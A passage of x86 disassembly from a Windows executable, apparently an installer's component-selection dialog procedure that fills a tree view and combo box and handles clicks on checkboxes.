  4047f6:	53                   	push   %ebx
  4047f7:	56                   	push   %esi
  4047f8:	75 17                	jne    0x404811
  4047fa:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  4047fe:	75 7d                	jne    0x40487d
  404800:	68 13 04 00 00       	push   $0x413
  404805:	e8 44 f5 ff ff       	call   0x403d4e
  40480a:	33 c0                	xor    %eax,%eax
  40480c:	e9 85 00 00 00       	jmp    0x404896
  404811:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  404818:	be 19 04 00 00       	mov    $0x419,%esi
  40481d:	75 1e                	jne    0x40483d
  40481f:	ff 75 08             	push   0x8(%ebp)
  404822:	ff 15 a4 81 40 00    	call   *0x4081a4
  404828:	85 c0                	test   %eax,%eax
  40482a:	74 51                	je     0x40487d
  40482c:	6a 01                	push   $0x1
  40482e:	ff 75 08             	push   0x8(%ebp)
  404831:	e8 38 ff ff ff       	call   0x40476e
  404836:	8b d8                	mov    %eax,%ebx
  404838:	89 75 0c             	mov    %esi,0xc(%ebp)
  40483b:	eb 03                	jmp    0x404840
  40483d:	8b 5d 14             	mov    0x14(%ebp),%ebx
  404840:	39 75 0c             	cmp    %esi,0xc(%ebp)
  404843:	75 3b                	jne    0x404880
  404845:	39 1d 90 a2 45 00    	cmp    %ebx,0x45a290
  40484b:	74 33                	je     0x404880
  40484d:	57                   	push   %edi
  40484e:	be 00 50 47 00       	mov    $0x475000,%esi
  404853:	56                   	push   %esi
  404854:	bf 60 a2 44 00       	mov    $0x44a260,%edi
  404859:	57                   	push   %edi
  40485a:	89 1d 90 a2 45 00    	mov    %ebx,0x45a290
  404860:	e8 6a 17 00 00       	call   0x405fcf
  404865:	53                   	push   %ebx
  404866:	56                   	push   %esi
  404867:	e8 aa 16 00 00       	call   0x405f16
  40486c:	6a 06                	push   $0x6
  40486e:	e8 6a cc ff ff       	call   0x4014dd
  404873:	57                   	push   %edi
  404874:	56                   	push   %esi
  404875:	e8 55 17 00 00       	call   0x405fcf
  40487a:	5f                   	pop    %edi
  40487b:	eb 03                	jmp    0x404880
  40487d:	8b 5d 14             	mov    0x14(%ebp),%ebx
  404880:	53                   	push   %ebx
  404881:	ff 75 10             	push   0x10(%ebp)
  404884:	ff 75 0c             	push   0xc(%ebp)
  404887:	ff 75 08             	push   0x8(%ebp)
  40488a:	ff 35 20 a2 43 00    	push   0x43a220
  404890:	ff 15 a0 81 40 00    	call   *0x4081a0
  404896:	5e                   	pop    %esi
  404897:	5b                   	pop    %ebx
  404898:	5d                   	pop    %ebp
  404899:	c2 10 00             	ret    $0x10
  40489c:	55                   	push   %ebp
  40489d:	8b ec                	mov    %esp,%ebp
  40489f:	83 ec 58             	sub    $0x58,%esp
  4048a2:	53                   	push   %ebx
  4048a3:	56                   	push   %esi
  4048a4:	8b 35 64 82 40 00    	mov    0x408264,%esi
  4048aa:	57                   	push   %edi
  4048ab:	68 f9 03 00 00       	push   $0x3f9
  4048b0:	ff 75 08             	push   0x8(%ebp)
  4048b3:	ff d6                	call   *%esi
  4048b5:	68 08 04 00 00       	push   $0x408
  4048ba:	ff 75 08             	push   0x8(%ebp)
  4048bd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4048c0:	ff d6                	call   *%esi
  4048c2:	8b 35 7c 82 40 00    	mov    0x40827c,%esi
  4048c8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4048cb:	a1 e8 45 47 00       	mov    0x4745e8,%eax
  4048d0:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4048d3:	a1 dc 45 47 00       	mov    0x4745dc,%eax
  4048d8:	05 94 00 00 00       	add    $0x94,%eax
  4048dd:	33 db                	xor    %ebx,%ebx
  4048df:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4048e6:	6a 10                	push   $0x10
  4048e8:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4048eb:	5f                   	pop    %edi
  4048ec:	0f 85 1a 02 00 00    	jne    0x404b0c
  4048f2:	8b 45 08             	mov    0x8(%ebp),%eax
  4048f5:	a3 30 46 47 00       	mov    %eax,0x474630
  4048fa:	a1 ec 45 47 00       	mov    0x4745ec,%eax
  4048ff:	c1 e0 02             	shl    $0x2,%eax
  404902:	50                   	push   %eax
  404903:	6a 40                	push   $0x40
  404905:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  404908:	c7 45 ec 02 00 00 00 	movl   $0x2,-0x14(%ebp)
  40490f:	ff 15 24 81 40 00    	call   *0x408124
  404915:	6a 6e                	push   $0x6e
  404917:	ff 35 d8 45 47 00    	push   0x4745d8
  40491d:	a3 3c e2 43 00       	mov    %eax,0x43e23c
  404922:	ff 15 a8 81 40 00    	call   *0x4081a8
  404928:	83 0d 90 a2 45 00 ff 	orl    $0xffffffff,0x45a290
  40492f:	68 ec 47 40 00       	push   $0x4047ec
  404934:	6a fc                	push   $0xfffffffc
  404936:	ff 75 fc             	push   -0x4(%ebp)
  404939:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40493c:	ff 15 68 82 40 00    	call   *0x408268
  404942:	53                   	push   %ebx
  404943:	6a 06                	push   $0x6
  404945:	6a 21                	push   $0x21
  404947:	57                   	push   %edi
  404948:	57                   	push   %edi
  404949:	a3 20 a2 43 00       	mov    %eax,0x43a220
  40494e:	ff 15 34 80 40 00    	call   *0x408034
  404954:	68 ff 00 ff 00       	push   $0xff00ff
  404959:	ff 75 f0             	push   -0x10(%ebp)
  40495c:	a3 38 e2 43 00       	mov    %eax,0x43e238
  404961:	50                   	push   %eax
  404962:	ff 15 28 80 40 00    	call   *0x408028
  404968:	ff 35 38 e2 43 00    	push   0x43e238
  40496e:	6a 02                	push   $0x2
  404970:	68 09 11 00 00       	push   $0x1109
  404975:	ff 75 fc             	push   -0x4(%ebp)
  404978:	ff d6                	call   *%esi
  40497a:	53                   	push   %ebx
  40497b:	53                   	push   %ebx
  40497c:	68 1c 11 00 00       	push   $0x111c
  404981:	ff 75 fc             	push   -0x4(%ebp)
  404984:	ff d6                	call   *%esi
  404986:	3b c7                	cmp    %edi,%eax
  404988:	7d 0c                	jge    0x404996
  40498a:	53                   	push   %ebx
  40498b:	57                   	push   %edi
  40498c:	68 1b 11 00 00       	push   $0x111b
  404991:	ff 75 fc             	push   -0x4(%ebp)
  404994:	ff d6                	call   *%esi
  404996:	ff 75 f0             	push   -0x10(%ebp)
  404999:	ff 15 44 80 40 00    	call   *0x408044
  40499f:	33 ff                	xor    %edi,%edi
  4049a1:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4049a4:	8b 04 b8             	mov    (%eax,%edi,4),%eax
  4049a7:	3b c3                	cmp    %ebx,%eax
  4049a9:	74 27                	je     0x4049d2
  4049ab:	83 ff 20             	cmp    $0x20,%edi
  4049ae:	74 03                	je     0x4049b3
  4049b0:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4049b3:	50                   	push   %eax
  4049b4:	53                   	push   %ebx
  4049b5:	e8 96 1c 00 00       	call   0x406650
  4049ba:	50                   	push   %eax
  4049bb:	53                   	push   %ebx
  4049bc:	68 43 01 00 00       	push   $0x143
  4049c1:	ff 75 f8             	push   -0x8(%ebp)
  4049c4:	ff d6                	call   *%esi
  4049c6:	57                   	push   %edi
  4049c7:	50                   	push   %eax
  4049c8:	68 51 01 00 00       	push   $0x151
  4049cd:	ff 75 f8             	push   -0x8(%ebp)
  4049d0:	ff d6                	call   *%esi
  4049d2:	47                   	inc    %edi
  4049d3:	83 ff 21             	cmp    $0x21,%edi
  4049d6:	7c c9                	jl     0x4049a1
  4049d8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4049db:	8b 7d 14             	mov    0x14(%ebp),%edi
  4049de:	ff 74 87 30          	push   0x30(%edi,%eax,4)
  4049e2:	6a 15                	push   $0x15
  4049e4:	ff 75 08             	push   0x8(%ebp)
  4049e7:	e8 f2 f2 ff ff       	call   0x403cde
  4049ec:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4049ef:	ff 74 87 34          	push   0x34(%edi,%eax,4)
  4049f3:	6a 16                	push   $0x16
  4049f5:	ff 75 08             	push   0x8(%ebp)
  4049f8:	e8 e1 f2 ff ff       	call   0x403cde
  4049fd:	33 ff                	xor    %edi,%edi
  4049ff:	39 1d ec 45 47 00    	cmp    %ebx,0x4745ec
  404a05:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  404a08:	0f 8e bc 00 00 00    	jle    0x404aca
  404a0e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404a11:	83 c0 08             	add    $0x8,%eax
  404a14:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404a17:	bb 32 11 00 00       	mov    $0x1132,%ebx
  404a1c:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404a1f:	8d 42 10             	lea    0x10(%edx),%eax
  404a22:	66 83 38 00          	cmpw   $0x0,(%eax)
  404a26:	0f 84 84 00 00 00    	je     0x404ab0
  404a2c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404a2f:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404a32:	8b 02                	mov    (%edx),%eax
  404a34:	6a 20                	push   $0x20
  404a36:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  404a39:	59                   	pop    %ecx
  404a3a:	8b d0                	mov    %eax,%edx
  404a3c:	23 d1                	and    %ecx,%edx
  404a3e:	c7 45 ac 02 00 ff ff 	movl   $0xffff0002,-0x54(%ebp)
  404a45:	c7 45 b0 0d 00 00 00 	movl   $0xd,-0x50(%ebp)
  404a4c:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  404a4f:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  404a52:	89 55 b8             	mov    %edx,-0x48(%ebp)
  404a55:	a8 02                	test   $0x2,%al
  404a57:	74 26                	je     0x404a7f
  404a59:	8d 45 a8             	lea    -0x58(%ebp),%eax
  404a5c:	50                   	push   %eax
  404a5d:	6a 00                	push   $0x0
  404a5f:	53                   	push   %ebx
  404a60:	ff 75 fc             	push   -0x4(%ebp)
  404a63:	c7 45 b0 4d 00 00 00 	movl   $0x4d,-0x50(%ebp)
  404a6a:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  404a71:	ff d6                	call   *%esi
  404a73:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404a76:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  404a7d:	eb 28                	jmp    0x404aa7
  404a7f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404a82:	f6 00 04             	testb  $0x4,(%eax)
  404a85:	74 14                	je     0x404a9b
  404a87:	ff 75 f4             	push   -0xc(%ebp)
  404a8a:	6a 03                	push   $0x3
  404a8c:	68 0a 11 00 00       	push   $0x110a
  404a91:	ff 75 fc             	push   -0x4(%ebp)
  404a94:	ff d6                	call   *%esi
  404a96:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404a99:	eb 15                	jmp    0x404ab0
  404a9b:	8d 45 a8             	lea    -0x58(%ebp),%eax
  404a9e:	50                   	push   %eax
  404a9f:	6a 00                	push   $0x0
  404aa1:	53                   	push   %ebx
  404aa2:	ff 75 fc             	push   -0x4(%ebp)
  404aa5:	ff d6                	call   *%esi
  404aa7:	8b 0d 3c e2 43 00    	mov    0x43e23c,%ecx
  404aad:	89 04 b9             	mov    %eax,(%ecx,%edi,4)
  404ab0:	81 45 f0 20 40 00 00 	addl   $0x4020,-0x10(%ebp)
  404ab7:	47                   	inc    %edi
  404ab8:	3b 3d ec 45 47 00    	cmp    0x4745ec,%edi
  404abe:	0f 8c 58 ff ff ff    	jl     0x404a1c
  404ac4:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  404ac8:	75 1a                	jne    0x404ae4
  404aca:	6a f0                	push   $0xfffffff0
  404acc:	ff 75 fc             	push   -0x4(%ebp)
  404acf:	ff 15 4c 82 40 00    	call   *0x40824c
  404ad5:	83 e0 fb             	and    $0xfffffffb,%eax
  404ad8:	50                   	push   %eax
  404ad9:	6a f0                	push   $0xfffffff0
  404adb:	ff 75 fc             	push   -0x4(%ebp)
  404ade:	ff 15 68 82 40 00    	call   *0x408268
  404ae4:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  404ae8:	75 18                	jne    0x404b02
  404aea:	6a 05                	push   $0x5
  404aec:	ff 75 f8             	push   -0x8(%ebp)
  404aef:	ff 15 38 82 40 00    	call   *0x408238
  404af5:	ff 75 f8             	push   -0x8(%ebp)
  404af8:	e8 3a f2 ff ff       	call   0x403d37
  404afd:	e9 7b 03 00 00       	jmp    0x404e7d
  404b02:	ff 75 fc             	push   -0x4(%ebp)
  404b05:	e8 2d f2 ff ff       	call   0x403d37
  404b0a:	33 db                	xor    %ebx,%ebx
  404b0c:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404b13:	75 11                	jne    0x404b26
  404b15:	89 5d 10             	mov    %ebx,0x10(%ebp)
  404b18:	c7 45 14 01 00 00 00 	movl   $0x1,0x14(%ebp)
  404b1f:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404b26:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  404b2a:	b8 13 04 00 00       	mov    $0x413,%eax
  404b2f:	74 09                	je     0x404b3a
  404b31:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404b34:	0f 85 dc 00 00 00    	jne    0x404c16
  404b3a:	8b 7d 14             	mov    0x14(%ebp),%edi
  404b3d:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404b40:	74 0d                	je     0x404b4f
  404b42:	81 7f 04 08 04 00 00 	cmpl   $0x408,0x4(%edi)
  404b49:	0f 85 c7 00 00 00    	jne    0x404c16
  404b4f:	f7 05 28 46 47 00 00 	testl  $0x200,0x474628
  404b56:	02 00 00 
  404b59:	75 79                	jne    0x404bd4
  404b5b:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404b5e:	74 09                	je     0x404b69
  404b60:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404b63:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  404b67:	75 6b                	jne    0x404bd4
  404b69:	33 c9                	xor    %ecx,%ecx
  404b6b:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404b6e:	0f 95 c1             	setne  %cl
  404b71:	51                   	push   %ecx
  404b72:	ff 75 fc             	push   -0x4(%ebp)
  404b75:	e8 f4 fb ff ff       	call   0x40476e
  404b7a:	3b c3                	cmp    %ebx,%eax
  404b7c:	7c 56                	jl     0x404bd4
  404b7e:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404b81:	8b c8                	mov    %eax,%ecx
  404b83:	69 c9 20 40 00 00    	imul   $0x4020,%ecx,%ecx
  404b89:	8d 54 11 08          	lea    0x8(%ecx,%edx,1),%edx
  404b8d:	8b 0a                	mov    (%edx),%ecx
  404b8f:	f6 c1 10             	test   $0x10,%cl
  404b92:	75 40                	jne    0x404bd4
  404b94:	f6 c1 40             	test   $0x40,%cl
  404b97:	74 14                	je     0x404bad
  404b99:	81 f1 80 00 00 00    	xor    $0x80,%ecx
  404b9f:	84 c9                	test   %cl,%cl
  404ba1:	79 05                	jns    0x404ba8
  404ba3:	83 c9 01             	or     $0x1,%ecx
  404ba6:	eb 08                	jmp    0x404bb0
  404ba8:	83 e1 fe             	and    $0xfffffffe,%ecx
  404bab:	eb 03                	jmp    0x404bb0
  404bad:	83 f1 01             	xor    $0x1,%ecx
  404bb0:	50                   	push   %eax
  404bb1:	89 0a                	mov    %ecx,(%edx)
  404bb3:	e8 ce c5 ff ff       	call   0x401186
  404bb8:	a1 28 46 47 00       	mov    0x474628,%eax
  404bbd:	33 c9                	xor    %ecx,%ecx
  404bbf:	c1 e8 08             	shr    $0x8,%eax
  404bc2:	41                   	inc    %ecx
  404bc3:	f7 d0                	not    %eax
  404bc5:	23 c1                	and    %ecx,%eax
  404bc7:	89 4d 10             	mov    %ecx,0x10(%ebp)
  404bca:	89 45 14             	mov    %eax,0x14(%ebp)
  404bcd:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404bd4:	3b fb                	cmp    %ebx,%edi
  404bd6:	74 3e                	je     0x404c16
  404bd8:	81 7f 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%edi)
  404bdf:	75 0e                	jne    0x404bef
  404be1:	ff 77 5c             	push   0x5c(%edi)
  404be4:	53                   	push   %ebx
  404be5:	68 19 04 00 00       	push   $0x419
  404bea:	ff 75 fc             	push   -0x4(%ebp)
  404bed:	ff d6                	call   *%esi
  404bef:	81 7f 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%edi)
  404bf6:	75 1e                	jne    0x404c16
  404bf8:	8b 47 5c             	mov    0x5c(%edi),%eax
  404bfb:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404bfe:	69 c0 20 40 00 00    	imul   $0x4020,%eax,%eax
  404c04:	83 7f 0c 02          	cmpl   $0x2,0xc(%edi)
  404c08:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404c0c:	75 05                	jne    0x404c13
  404c0e:	83 08 20             	orl    $0x20,(%eax)
  404c11:	eb 03                	jmp    0x404c16
  404c13:	83 20 df             	andl   $0xffffffdf,(%eax)
  404c16:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404c1d:	75 75                	jne    0x404c94
  404c1f:	b8 f9 03 00 00       	mov    $0x3f9,%eax
  404c24:	66 39 45 10          	cmp    %ax,0x10(%ebp)
  404c28:	0f 85 4f 02 00 00    	jne    0x404e7d
  404c2e:	8b 45 10             	mov    0x10(%ebp),%eax
  404c31:	c1 e8 10             	shr    $0x10,%eax
  404c34:	66 83 f8 01          	cmp    $0x1,%ax
  404c38:	0f 85 3f 02 00 00    	jne    0x404e7d
  404c3e:	53                   	push   %ebx
  404c3f:	53                   	push   %ebx
  404c40:	68 47 01 00 00       	push   $0x147
  404c45:	ff 75 f8             	push   -0x8(%ebp)
  404c48:	ff d6                	call   *%esi
  404c4a:	83 f8 ff             	cmp    $0xffffffff,%eax
  404c4d:	0f 84 2a 02 00 00    	je     0x404e7d
  404c53:	53                   	push   %ebx
  404c54:	50                   	push   %eax
  404c55:	68 50 01 00 00       	push   $0x150
  404c5a:	ff 75 f8             	push   -0x8(%ebp)
  404c5d:	ff d6                	call   *%esi
  404c5f:	8b f8                	mov    %eax,%edi
  404c61:	83 ff ff             	cmp    $0xffffffff,%edi
  404c64:	74 08                	je     0x404c6e
  404c66:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404c69:	39 1c b8             	cmp    %ebx,(%eax,%edi,4)
  404c6c:	75 03                	jne    0x404c71
  404c6e:	6a 20                	push   $0x20
  404c70:	5f                   	pop    %edi
  404c71:	57                   	push   %edi
  404c72:	e8 2f c6 ff ff       	call   0x4012a6
  404c77:	57                   	push   %edi
  404c78:	53                   	push   %ebx
  404c79:	68 20 04 00 00       	push   $0x420
  404c7e:	ff 75 08             	push   0x8(%ebp)
  404c81:	ff d6                	call   *%esi
  404c83:	c7 45 10 01 00 00 00 	movl   $0x1,0x10(%ebp)
  404c8a:	89 5d 14             	mov    %ebx,0x14(%ebp)
  404c8d:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404c94:	81 7d 0c 00 02 00 00 	cmpl   $0x200,0xc(%ebp)
  404c9b:	75 0c                	jne    0x404ca9
  404c9d:	53                   	push   %ebx
  404c9e:	53                   	push   %ebx
  404c9f:	68 00 02 00 00       	push   $0x200
  404ca4:	ff 75 fc             	push   -0x4(%ebp)
  404ca7:	ff d6                	call   *%esi
  404ca9:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404cb0:	75 32                	jne    0x404ce4
  404cb2:	a1 38 e2 43 00       	mov    0x43e238,%eax
  404cb7:	3b c3                	cmp    %ebx,%eax
  404cb9:	74 07                	je     0x404cc2
  404cbb:	50                   	push   %eax
  404cbc:	ff 15 2c 80 40 00    	call   *0x40802c
  404cc2:	a1 3c e2 43 00       	mov    0x43e23c,%eax
  404cc7:	3b c3                	cmp    %ebx,%eax
  404cc9:	74 07                	je     0x404cd2
  404ccb:	50                   	push   %eax
  404ccc:	ff 15 30 81 40 00    	call   *0x408130
  404cd2:	89 1d 38 e2 43 00    	mov    %ebx,0x43e238
  404cd8:	89 1d 3c e2 43 00    	mov    %ebx,0x43e23c
  404cde:	89 1d 30 46 47 00    	mov    %ebx,0x474630
  404ce4:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404ceb:	0f 85 4b 01 00 00    	jne    0x404e3c
  404cf1:	53                   	push   %ebx
  404cf2:	53                   	push   %ebx
  404cf3:	e8 00 c5 ff ff       	call   0x4011f8
  404cf8:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  404cfb:	74 07                	je     0x404d04
  404cfd:	6a 08                	push   $0x8
  404cff:	e8 d9 c7 ff ff       	call   0x4014dd
  404d04:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  404d07:	74 3f                	je     0x404d48
  404d09:	ff 35 3c e2 43 00    	push   0x43e23c
  404d0f:	e8 dd c5 ff ff       	call   0x4012f1
  404d14:	8b f8                	mov    %eax,%edi
  404d16:	57                   	push   %edi
  404d17:	e8 8a c5 ff ff       	call   0x4012a6
  404d1c:	33 c0                	xor    %eax,%eax
  404d1e:	33 c9                	xor    %ecx,%ecx
  404d20:	3b fb                	cmp    %ebx,%edi
  404d22:	7e 0e                	jle    0x404d32
  404d24:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  404d27:	39 1c 82             	cmp    %ebx,(%edx,%eax,4)
  404d2a:	74 01                	je     0x404d2d
  404d2c:	41                   	inc    %ecx
  404d2d:	40                   	inc    %eax
  404d2e:	3b c7                	cmp    %edi,%eax
  404d30:	7c f2                	jl     0x404d24
  404d32:	53                   	push   %ebx
  404d33:	51                   	push   %ecx
  404d34:	68 4e 01 00 00       	push   $0x14e
  404d39:	ff 75 f8             	push   -0x8(%ebp)
  404d3c:	ff d6                	call   *%esi
  404d3e:	89 7d 14             	mov    %edi,0x14(%ebp)
  404d41:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  404d48:	53                   	push   %ebx
  404d49:	53                   	push   %ebx
  404d4a:	e8 a9 c4 ff ff       	call   0x4011f8
  404d4f:	39 1d ec 45 47 00    	cmp    %ebx,0x4745ec
  404d55:	a1 3c e2 43 00       	mov    0x43e23c,%eax
  404d5a:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404d5d:	a1 e8 45 47 00       	mov    0x4745e8,%eax
  404d62:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  404d69:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  404d6c:	0f 8e a1 00 00 00    	jle    0x404e13
  404d72:	8d 78 08             	lea    0x8(%eax),%edi
  404d75:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404d78:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404d7b:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  404d7e:	3b c3                	cmp    %ebx,%eax
  404d80:	74 79                	je     0x404dfb
  404d82:	8b 0f                	mov    (%edi),%ecx
  404d84:	89 45 bc             	mov    %eax,-0x44(%ebp)
  404d87:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  404d8e:	f7 c1 00 01 00 00    	test   $0x100,%ecx
  404d94:	74 13                	je     0x404da9
  404d96:	8d 47 10             	lea    0x10(%edi),%eax
  404d99:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  404da0:	89 45 c8             	mov    %eax,-0x38(%ebp)
  404da3:	81 27 ff fe ff ff    	andl   $0xfffffeff,(%edi)
  404da9:	f6 c1 40             	test   $0x40,%cl
  404dac:	74 05                	je     0x404db3
  404dae:	6a 03                	push   $0x3
  404db0:	58                   	pop    %eax
  404db1:	eb 0e                	jmp    0x404dc1
  404db3:	8b c1                	mov    %ecx,%eax
  404db5:	83 e0 01             	and    $0x1,%eax
  404db8:	40                   	inc    %eax
  404db9:	f6 c1 10             	test   $0x10,%cl
  404dbc:	74 03                	je     0x404dc1
  404dbe:	83 c0 03             	add    $0x3,%eax
  404dc1:	ff 75 bc             	push   -0x44(%ebp)
  404dc4:	8b d1                	mov    %ecx,%edx
  404dc6:	c1 e0 0b             	shl    $0xb,%eax
  404dc9:	83 e2 08             	and    $0x8,%edx
  404dcc:	0b c2                	or     %edx,%eax
  404dce:	8b d1                	mov    %ecx,%edx
  404dd0:	c1 f9 05             	sar    $0x5,%ecx
  404dd3:	03 c0                	add    %eax,%eax
  404dd5:	83 e2 20             	and    $0x20,%edx
  404dd8:	0b c2                	or     %edx,%eax
  404dda:	83 e1 01             	and    $0x1,%ecx
  404ddd:	41                   	inc    %ecx
  404dde:	51                   	push   %ecx
  404ddf:	68 02 11 00 00       	push   $0x1102
  404de4:	ff 75 fc             	push   -0x4(%ebp)
  404de7:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404dea:	ff d6                	call   *%esi
  404dec:	8d 45 b8             	lea    -0x48(%ebp),%eax
  404def:	50                   	push   %eax
  404df0:	53                   	push   %ebx
  404df1:	68 3f 11 00 00       	push   $0x113f
  404df6:	ff 75 fc             	push   -0x4(%ebp)
  404df9:	ff d6                	call   *%esi
  404dfb:	ff 45 e8             	incl   -0x18(%ebp)
  404dfe:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404e01:	81 c7 20 40 00 00    	add    $0x4020,%edi
  404e07:	3b 05 ec 45 47 00    	cmp    0x4745ec,%eax
  404e0d:	0f 8c 62 ff ff ff    	jl     0x404d75
  404e13:	6a 01                	push   $0x1
  404e15:	53                   	push   %ebx
  404e16:	ff 75 fc             	push   -0x4(%ebp)
  404e19:	ff 15 78 82 40 00    	call   *0x408278
  404e1f:	a1 a8 c5 46 00       	mov    0x46c5a8,%eax
  404e24:	39 58 10             	cmp    %ebx,0x10(%eax)
  404e27:	74 13                	je     0x404e3c
  404e29:	6a 05                	push   $0x5
  404e2b:	e8 c3 f5 ff ff       	call   0x4043f3
  404e30:	6a fb                	push   $0xfffffffb
  404e32:	68 ff 03 00 00       	push   $0x3ff
  404e37:	e8 ee f4 ff ff       	call   0x40432a
  404e3c:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  404e43:	75 38                	jne    0x404e7d
  404e45:	f7 05 28 46 47 00 00 	testl  $0x100,0x474628
  404e4c:	01 00 00 
  404e4f:	74 2c                	je     0x404e7d
  404e51:	8b 35 38 82 40 00    	mov    0x408238,%esi
  404e57:	33 c0                	xor    %eax,%eax
  404e59:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  404e5d:	0f 94 c0             	sete   %al
  404e60:	c1 e0 03             	shl    $0x3,%eax
  404e63:	8b f8                	mov    %eax,%edi
  404e65:	57                   	push   %edi
  404e66:	ff 75 fc             	push   -0x4(%ebp)
  404e69:	ff d6                	call   *%esi
  404e6b:	57                   	push   %edi
  404e6c:	68 fe 03 00 00       	push   $0x3fe
  404e71:	ff 75 08             	push   0x8(%ebp)
  404e74:	ff 15 64 82 40 00    	call   *0x408264
  404e7a:	50                   	push   %eax
  404e7b:	ff d6                	call   *%esi
  404e7d:	ff 75 14             	push   0x14(%ebp)
  404e80:	8b 45 0c             	mov    0xc(%ebp),%eax
  404e83:	ff 75 10             	push   0x10(%ebp)
  404e86:	e8 de ee ff ff       	call   0x403d69
  404e8b:	5f                   	pop    %edi
  404e8c:	5e                   	pop    %esi
  404e8d:	5b                   	pop    %ebx
  404e8e:	c9                   	leave
  404e8f:	c2 10 00             	ret    $0x10
  404e92:	55                   	push   %ebp
  404e93:	8b ec                	mov    %esp,%ebp
  404e95:	83 ec 54             	sub    $0x54,%esp
  404e98:	83 3d 10 a2 43 00 00 	cmpl   $0x0,0x43a210
  404e9f:	a1 8c c5 46 00       	mov    0x46c58c,%eax
  404ea4:	53                   	push   %ebx
  404ea5:	8b 1d 7c 82 40 00    	mov    0x40827c,%ebx
  404eab:	56                   	push   %esi
  404eac:	57                   	push   %edi
  404ead:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404eb0:	be 50 22 44 00       	mov    $0x442250,%esi
  404eb5:	0f 84 85 00 00 00    	je     0x404f40
  404ebb:	83 65 e8 00          	andl   $0x0,-0x18(%ebp)
  404ebf:	33 c0                	xor    %eax,%eax
  404ec1:	f6 05 b4 46 47 00 01 	testb  $0x1,0x4746b4
  404ec8:	8d 7d ec             	lea    -0x14(%ebp),%edi
  404ecb:	ab                   	stos   %eax,%es:(%edi)
  404ecc:	ab                   	stos   %eax,%es:(%edi)
  404ecd:	75 09                	jne    0x404ed8
  404ecf:	ff 75 08             	push   0x8(%ebp)
  404ed2:	56                   	push   %esi
  404ed3:	e8 78 17 00 00       	call   0x406650
  404ed8:	56                   	push   %esi
  404ed9:	e8 07 11 00 00       	call   0x405fe5
  404ede:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  404ee2:	8b f8                	mov    %eax,%edi
  404ee4:	74 1e                	je     0x404f04
  404ee6:	ff 75 0c             	push   0xc(%ebp)
  404ee9:	e8 f7 10 00 00       	call   0x405fe5
  404eee:	03 c7                	add    %edi,%eax
  404ef0:	3d 10 80 00 00       	cmp    $0x8010,%eax
  404ef5:	0f 83 ff 00 00 00    	jae    0x404ffa
  404efb:	ff 75 0c             	push   0xc(%ebp)
  404efe:	56                   	push   %esi
  404eff:	e8 56 11 00 00       	call   0x40605a
  404f04:	ff 35 a4 c5 46 00    	push   0x46c5a4
  404f0a:	83 65 e8 00          	andl   $0x0,-0x18(%ebp)
